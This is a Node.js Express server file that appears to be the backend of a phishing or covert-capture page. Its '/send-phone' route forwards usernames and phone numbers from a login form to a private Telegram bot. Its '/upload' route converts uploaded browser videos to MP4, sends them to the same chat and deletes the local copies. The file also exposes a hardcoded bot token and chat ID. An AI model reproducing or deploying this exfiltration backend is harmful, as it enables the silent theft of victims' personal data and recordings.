const express = require("express");
const multer = require("multer");
const fs = require("fs");
const axios = require("axios");
const FormData = require("form-data");
const cors = require("cors");
const ffmpeg = require("fluent-ffmpeg");
const path = require("path");

const app = express();

// =====================
// ⚙️ MIDDLEWARE & SETUP
// =====================
// Allows Surge to talk to Render
app.use(cors());

// Tells the server how to read JSON data from the login screen
app.use(express.json()); 

// Ensure uploads folder exists so Render doesn't crash on boot
if (!fs.existsSync("uploads")) {
    fs.mkdirSync("uploads");
    console.log("✅ Created 'uploads' directory");
}

// =====================
// 📁 FILE STORAGE
// =====================
const storage = multer.diskStorage({
    destination: "uploads/",
    filename: (req, file, cb) => {
        const ext = file.originalname.split(".").pop() || "webm";
        cb(null, `${Date.now()}.${ext}`); 
    }
});

const upload = multer({ storage });

// =====================
// 🔑 CONFIG
// =====================
const BOT_TOKEN = "8662744373:AAHjNatUA4lnCNtpIRETqPUuTDVENOTXROc";
const CHAT_ID = "8280326139";

// =====================
// 📱 PHONE LOGIN ROUTE
// =====================
app.post("/send-phone", async (req, res) => {
    const { username, phone } = req.body;
    
    if (!username || !phone) {
        return res.status(400).send("Missing data");
    }

    console.log(`👤 New Login: ${username} (${phone})`);

    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: `🔔 *New Login*\n👤 User: ${username}\n📱 Phone: ${phone}`,
            parse_mode: "Markdown"
        });
        res.status(200).send("Login sent to bot");
    } catch (err) {
        console.error("❌ Telegram Login Error:", err.message);
        res.status(500).send("Bot failed to send login");
    }
});

// =====================
// 🚀 VIDEO UPLOAD ROUTE
// =====================
app.post("/upload", upload.single("video"), async (req, res) => {
    let filePath;
    let mp4Path;

    try {
        console.log("\n==============================");
        console.log("🚀 Upload received");

        if (!req.file) {
            console.log("❌ No file uploaded");
            return res.status(400).send("No file uploaded");
        }

        filePath = req.file.path;
        mp4Path = filePath + ".mp4";

        console.log("📁 File path:", filePath);
        console.log("🎥 MIME type:", req.file.mimetype);

        // =====================
        // 🔄 FFmpeg conversion (safe)
        // =====================
        console.log("🔄 Starting FFmpeg conversion...");

        await new Promise((resolve, reject) => {
            ffmpeg(filePath)
                .outputOptions([
                    "-c:v libx264",
                    "-preset ultrafast",
                    "-pix_fmt yuv420p",
                    "-c:a aac"
                ])
                .save(mp4Path)
                .on("start", cmd => {
                    console.log("🎬 FFmpeg command running...");
                })
                .on("end", () => {
                    console.log("✅ FFmpeg conversion complete");
                    resolve();
                })
                .on("error", err => {
                    console.error("❌ FFmpeg ERROR:", err.message);
                    reject(err);
                });
        });

        console.log("📦 Converted file:", mp4Path);

        // =====================
        // 📤 TELEGRAM UPLOAD
        // =====================
        console.log("📤 Sending to Telegram...");

        const form = new FormData();
        form.append("chat_id", CHAT_ID);
        form.append("video", fs.createReadStream(mp4Path), {
            filename: "specimen.mp4",
            contentType: "video/mp4"
        });

        const response = await axios.post(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, 
            form,
            { headers: form.getHeaders() }
        );

        console.log("📨 Telegram response success!");

        // =====================
        // 🧹 CLEANUP
        // =====================
        fs.unlinkSync(filePath);
        fs.unlinkSync(mp4Path);

        console.log("🧹 Cleanup done");
        console.log("==============================\n");

        res.send("Upload successful");

    } catch (err) {
        console.error("\n❌ ERROR OCCURRED ❌");
        console.error("Message:", err.message);

        if (err.response?.data) {
            console.error("Telegram/API error:", err.response.data);
        }

        try {
            if (filePath && fs.existsSync(filePath)) fs.unlinkSync(filePath);
            if (mp4Path && fs.existsSync(mp4Path)) fs.unlinkSync(mp4Path);
        } catch (cleanupErr) {
            console.error("Cleanup error:", cleanupErr.message);
        }

        res.status(500).send("Failed (check server logs)");
    }
});

// =====================
// 🌐 START SERVER
// =====================
app.listen(3000, () => {
    console.log("🌐 Server running and ready for Surge connections");
});
